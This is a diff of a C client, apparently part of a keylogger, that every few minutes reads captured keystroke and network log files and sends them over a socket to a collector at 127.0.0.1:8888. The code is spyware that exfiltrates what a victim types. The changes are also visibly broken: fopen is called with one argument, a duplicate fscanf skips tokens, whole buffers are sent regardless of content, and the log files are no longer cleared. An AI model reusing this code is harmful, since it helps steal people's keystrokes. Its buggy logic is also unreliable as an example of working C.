@@ -3,12 +3,15 @@
 
 #include "client.h"
 
+#define BUFFER_SIZE 4096
+
 void start_client(void)
 {
     // Variables
     int sock, read_size, ret;
     struct sockaddr_in server;
-    char send_buffer[1000];
+    char send_buffer[BUFFER_SIZE];
+    struct stat stat_buf;
     
     char *addr = "127.0.0.1";  // localhost
     short port = 8888;
@@ -36,36 +39,43 @@ void start_client(void)
     
     while(1)
     {
-        sleep(15); // wait 300sec = 5 min before sending logs again
+        sleep(180); // wait 180sec = 3 min before sending logs again
+        int bytes_sent=0;
+        
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
-        FILE *keylog_log = fopen("log/keylog.txt", "a");
+        FILE *keylog_log = fopen("log/keylog.txt", "r");
         /*Write keylog file*/
-        while(!feof(keylog_log))
+        while(fscanf(keylog_log,"%s",send_buffer) != EOF)
         {
-            if ((ret = write(sock, &send_buffer, strlen(send_buffer))) <= 0) {
+            fscanf(keylog_log,"%s",send_buffer);
+            ret = write(sock, &send_buffer, sizeof(send_buffer));
+            if(ret <=0){
                 perror("Error writing keylog log\n");
                 close(sock);
                 exit(0);
             }
         }
+
         /*Clear and close keylog file*/
-        fclose(fopen("log/keylog.txt", "w"));
+        fclose(fopen("log/keylog.txt");
         
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open network_log file for writing*/
-        FILE *network_log = fopen("log/network.txt", "a");
+        FILE *network_log = fopen("log/network.txt", "r");
         /*Write keylog file*/
-        while(!feof(network_log))
+        while(fscanf(network_log,"%s",send_buffer) != EOF)
         {
-            if ((ret = write(sock, &send_buffer, strlen(send_buffer))) <= 0) {
+            ;
+            ret = write(sock, &send_buffer, sizeof(send_buffer));
+            if(ret <=0){
                 perror("Error writing network log\n");
                 close(sock);
                 exit(0);
             }
         }
         /*Clear and close keylog file*/
-        fclose(fopen("log/network.txt", "w"));
+        fclose(fopen("log/network.txt"));
     }
     close(sock);
 }
